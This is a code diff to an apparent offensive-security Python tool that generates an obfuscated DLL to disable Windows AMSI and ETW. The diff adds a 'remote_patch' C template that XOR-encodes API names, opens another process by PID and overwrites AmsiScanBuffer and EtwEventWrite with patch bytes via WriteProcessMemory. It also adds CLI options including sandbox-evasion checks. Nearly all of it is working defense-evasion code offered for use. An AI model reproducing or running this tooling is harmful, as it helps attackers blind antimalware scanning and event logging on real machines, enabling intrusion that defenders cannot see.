@@ -17,7 +17,7 @@ f_VirtualProtect l_VirtualProtect;
 
 unsigned char* decode(unsigned char *encoded, unsigned char key[], int keylen, int long size)
 {
-    unsigned char* decoded = (unsigned char*)malloc(size);
+    unsigned char* decoded = (unsigned char*)malloc(size+1);
     for (int i = 0; i < size; i++)
     {
         decoded[i] = encoded[i] ^ key[i % keylen];
@@ -94,6 +94,116 @@ int main() {
 
 
 BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
+    switch(dwReason){
+        case DLL_PROCESS_ATTACH:
+            main();
+            break;
+        case DLL_PROCESS_DETACH:
+            break;
+        case DLL_THREAD_ATTACH:
+            break;
+        case DLL_THREAD_DETACH:
+            break;
+    }
+    return TRUE;
+}
+"""
+
+remote_patch_template = """
+#include <windows.h>
+#include <stdio.h>
+
+typedef HANDLE (WINAPI *f_OpenProcess)(DWORD, WINBOOL, DWORD);
+typedef WINBOOL (WINAPI *f_WriteProcessMemory)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T);
+typedef WINBOOL (WINAPI *f_CloseHandle)(HANDLE);
+
+f_OpenProcess l_OpenProcess;
+f_WriteProcessMemory l_WriteProcessMemory;
+f_CloseHandle l_CloseHandle;
+
+unsigned char* decode(unsigned char *encoded, unsigned char key[], int keylen, int long size)
+{
+    unsigned char* decoded = (unsigned char*)malloc(size+1);
+    for (int i = 0; i < size; i++)
+    {
+        decoded[i] = encoded[i] ^ key[i % keylen];
+        //printf("%x\\n", decoded[i]);
+        if (i == (size-1)) {
+            decoded[i+1] = '\\0';
+        }
+    }
+    return decoded;
+}
+
+//REPLACE_SANDBOX_CHECK
+
+int main() {
+    //REPLACE_CALL_SANDBOX_CHECK
+    
+    // decode strings
+    unsigned char enc_OpenProcess[] = { REPLACE_OpenProcess };
+    unsigned char enc_CloseHandle[] = { REPLACE_CloseHandle };
+    unsigned char enc_kernel32dll[] = { REPLACE_kernel32.dll };
+    unsigned char enc_amsidll[] = { REPLACE_amsi.dll };
+    unsigned char enc_AmsiScanBuffer[] = { REPLACE_AmsiScanBuffer };
+    unsigned char enc_ntdll[] = { REPLACE_ntdll.dll };
+    unsigned char enc_EtwEventWrite[] = { REPLACE_EtwEventWrite };
+    unsigned char enc_WriteProcessMemory[] = { REPLACE_WriteProcessMemory };
+
+    unsigned char key[] = "REPLACE_XORKEY";
+    int keylen = (sizeof(key) / sizeof(key[0]))-1;
+
+    int long xorsize = sizeof(enc_OpenProcess) / sizeof(enc_OpenProcess[0]);
+    unsigned char* str_OpenProcess = decode(enc_OpenProcess, key, keylen, xorsize);
+
+    xorsize = sizeof(enc_CloseHandle) / sizeof(enc_CloseHandle[0]);
+    unsigned char* str_CloseHandle = decode(enc_CloseHandle, key, keylen, xorsize);
+
+    xorsize = sizeof(enc_kernel32dll) / sizeof(enc_kernel32dll[0]);
+    unsigned char* str_kernel32dll = decode(enc_kernel32dll, key, keylen, xorsize);
+
+    xorsize = sizeof(enc_amsidll) / sizeof(enc_amsidll[0]);
+    unsigned char* str_amsidll = decode(enc_amsidll, key, keylen, xorsize);
+
+    xorsize = sizeof(enc_AmsiScanBuffer) / sizeof(enc_AmsiScanBuffer[0]);
+    unsigned char* str_AmsiScanBuffer = decode(enc_AmsiScanBuffer, key, keylen, xorsize);
+
+    xorsize = sizeof(enc_ntdll) / sizeof(enc_ntdll[0]);
+    unsigned char* str_ntdll = decode(enc_ntdll, key, keylen, xorsize);
+
+    xorsize = sizeof(enc_EtwEventWrite) / sizeof(enc_EtwEventWrite[0]);
+    unsigned char* str_EtwEventWrite = decode(enc_EtwEventWrite, key, keylen, xorsize);
+
+    xorsize = sizeof(enc_WriteProcessMemory) / sizeof(enc_WriteProcessMemory[0]);
+    unsigned char* str_WriteProcessMemory = decode(enc_WriteProcessMemory, key, keylen, xorsize);
+
+    // get winapi functions
+    l_OpenProcess = (f_OpenProcess)GetProcAddress(GetModuleHandle(str_kernel32dll), str_OpenProcess);
+    l_WriteProcessMemory = (f_WriteProcessMemory)GetProcAddress(GetModuleHandle(str_kernel32dll), str_WriteProcessMemory);
+    l_CloseHandle = (f_CloseHandle)GetProcAddress(GetModuleHandle(str_kernel32dll), str_CloseHandle);
+
+    //get pid and open handle to process
+    //REPLACE_GET_PID
+    HANDLE hProc = NULL;
+    SIZE_T bytesWritten;
+    hProc = l_OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, (DWORD)pid);
+
+    //patch amsi
+    unsigned char amsibypass[6] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
+    PVOID ptrAmsiScanBuffer = GetProcAddress(LoadLibraryA(str_amsidll), str_AmsiScanBuffer);
+    BOOL success = l_WriteProcessMemory(hProc, ptrAmsiScanBuffer, (PVOID)amsibypass, sizeof(amsibypass), &bytesWritten);
+
+    //patch etw
+    unsigned char etwPatch[1] = { 0xC3 };
+    PVOID ptrEtwEventWrite = GetProcAddress(LoadLibraryA(str_ntdll), str_EtwEventWrite);
+    success = l_WriteProcessMemory(hProc, ptrEtwEventWrite, (PVOID)etwPatch, sizeof(etwPatch), &bytesWritten);
+
+    l_CloseHandle(hProc);
+    return 0;
+}
+
+
+__declspec(dllexport)BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
     switch(dwReason){
         case DLL_PROCESS_ATTACH:
             main();
@@ -593,11 +703,24 @@ def generateRandomSyscall(length):
     syscall = ''.join(random.choice(letters) for i in range(length))
     return syscall
 
-def execute(template, method, xorkey, sandbox, sandbox_arg, outfile):
+def execute(template, method, xorkey, sandbox, sandbox_arg, outfile, pid):
     # Use hardware breakpoint template if enabled
     if method == "hwbp":
         print("[+] Hardware breakpoint method enabled")
         template = hardware_bp_template
+    # Use remote patch template if enabled
+    elif method == "remote_patch":
+        print("[+] Remote patch template enabled")
+        template = remote_patch_template
+        if pid != "":
+            template = template.replace("//REPLACE_GET_PID", f"int pid = {pid};")
+        else:
+            print("[!] No PID specified for remote process! Will attempt to read PID from STDIN...")
+            choice = input("[!] This may not work in all situations. Are you sure you want to continue? [y/N]: ").lower()
+            if choice == "y":
+                template = template.replace("//REPLACE_GET_PID", 'int pid;\n    printf("> ");\n    scanf("%d", &pid);')
+            else:
+                exit()
 
     # Create XOR key if none is supplied
     if xorkey == "" or xorkey == None:
@@ -611,6 +734,8 @@ def execute(template, method, xorkey, sandbox, sandbox_arg, outfile):
         user_funcs = ["rip_ret_patch", "find_gadget", "insert_descriptor_entry", "hardware_engine_init", "exception_handler", "set_hardware_breakpoints", "set_hardware_breakpoint"]
         winapi_funcs = ["f_GetCurrentThreadId", "f_GetCurrentProcessId", "f_GetCurrentThread", "f_OpenThread", "f_GetThreadContext", "f_SetThreadContext", "f_CloseHandle", "f_CreateToolhelp32Snapshot", "f_Thread32First", "f_Thread32Next", "f_EnterCriticalSection", "f_LeaveCriticalSection", "f_LeaveCriticalSection", "f_AddVectoredExceptionHandler", "f_InitializeCriticalSection", "l_GetCurrentThreadId", "l_GetCurrentProcessId", "l_GetCurrentThread", "l_OpenThread", "l_GetThreadContext", "l_SetThreadContext", "l_CloseHandle", "l_CreateToolhelp32Snapshot", "l_Thread32First", "l_Thread32Next", "l_EnterCriticalSection", "l_LeaveCriticalSection", "l_LeaveCriticalSection", "l_AddVectoredExceptionHandler", "l_InitializeCriticalSection"]
         all_funcs = user_funcs + winapi_funcs
+    elif method == "remote_patch":
+        all_funcs = ["f_OpenProcess", "f_WriteProcessMemory", "f_CloseHandle", "l_OpenProcess", "l_WriteProcessMemory", "l_CloseHandle"]
     else:
         all_funcs = ["f_NtWriteVirtualMemory", "f_VirtualProtect", "l_NtWriteVirtualMemory", "l_VirtualProtect"]
     for func in all_funcs:
@@ -625,6 +750,8 @@ def execute(template, method, xorkey, sandbox, sandbox_arg, outfile):
     print("[+] XOR encoding strings")
     if method == "hwbp":
         toEncode = ["amsi.dll", "AmsiScanBuffer", "ntdll.dll", "EtwEventWrite", "VirtualProtect", "kernel32.dll", "NtTraceEvent", "GetCurrentThreadId", "GetCurrentProcessId", "GetCurrentThread", "OpenThread", "GetThreadContext", "SetThreadContext", "CloseHandle", "CreateToolhelp32Snapshot", "Thread32First", "Thread32Next", "EnterCriticalSection", "LeaveCriticalSection", "AddVectoredExceptionHandler", "InitializeCriticalSection"]
+    elif method == "remote_patch":
+        toEncode = ["amsi.dll", "AmsiScanBuffer", "ntdll.dll", "EtwEventWrite", "OpenProcess", "kernel32.dll", "WriteProcessMemory", "CloseHandle"]
     else:
         toEncode = ["amsi.dll", "AmsiScanBuffer", "ntdll.dll", "EtwEventWrite", "VirtualProtect", "kernel32.dll", "NtWriteVirtualMemory"]
     for strEnc in toEncode:
@@ -659,11 +786,13 @@ def execute(template, method, xorkey, sandbox, sandbox_arg, outfile):
 if __name__ == '__main__':
     print(inspiration[1:-1])
     parser = argparse.ArgumentParser(description="Generate an obfuscated DLL that will disable AMSI & ETW")
-    parser.add_argument('-m', '--method', dest='method', help='Bypass technique (Options: patch, hwbp) (Default: patch)', metavar='<method>', default='patch')
+    parser.add_argument('-m', '--method', dest='method', help='Bypass technique (Options: patch, hwbp, remote_patch) (Default: patch)', metavar='<method>', default='patch')
     parser.add_argument('-s', '--sandbox', dest='sandbox', help='Sandbox evasion technique (Options: mathsleep, username, hostname, domain) (Default: mathsleep)', metavar='<option>', default='mathsleep')
     parser.add_argument('-sa', '--sandbox-arg', dest='sandbox_arg', help='Argument for sandbox evasion technique (Ex: WIN10CO-DESKTOP, testlab.local)', metavar='<value>', default='')
     parser.add_argument('-k', '--key', dest='key', help='Key to encode strings with (randomly generated by default)', metavar='<key>', default='')
     parser.add_argument('-o', '--outfile', dest='outfile', help='File to save DLL to', metavar='<outfile>', default='out.dll')
+    remote_options = parser.add_argument_group('Remote options')
+    remote_options.add_argument('-p', '--pid', dest='pid', metavar='<pid>', help='PID of remote process to patch', default='')
     args = parser.parse_args()
     method = args.method.lower()
     sandbox = args.sandbox.lower()
@@ -676,8 +805,8 @@ if __name__ == '__main__':
         parser.print_help()
         print("\n[!] No sandbox argument! You must supply a value to the and -sa flag.")
         exit()
-    if method != "patch" and method != "hwbp":
+    if method != "patch" and method != "remote_patch" and method != "hwbp":
         parser.print_help()
-        print("\n[!] Invalid bypass technique specified! Please supply either 'patch' or 'hwbp' to the -m flag.")
+        print("\n[!] Invalid bypass technique specified! Please supply either 'patch', 'remote_patch', or 'hwbp' to the -m flag.")
         exit()
-    execute(template, method, args.key, sandbox, sandbox_arg, args.outfile)
+    execute(template, method, args.key, sandbox, sandbox_arg, args.outfile, args.pid)
